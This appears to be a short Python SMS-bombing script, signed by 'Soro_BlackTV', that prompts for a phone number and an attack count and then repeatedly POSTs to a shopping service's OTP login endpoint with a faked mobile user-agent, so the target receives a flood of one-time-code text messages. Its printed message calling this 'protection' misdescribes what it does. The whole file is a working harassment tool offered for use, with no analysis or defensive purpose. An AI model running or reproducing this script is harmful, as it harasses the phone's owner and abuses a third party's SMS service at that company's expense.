import requests
import time
print("\n")
print("""
       [ SMS FREE ]
    BY : Soro_BlackTV
       """)
       
no = input(" mobile => ")
soro = int(input(" attack => "))
print("")

for i in range(soro):
	time.sleep(1)
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":no,"namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print(f"protection mobile {no} Block")
	
	
	
	
	
#API NOOB EIEI
#BY [SORO]
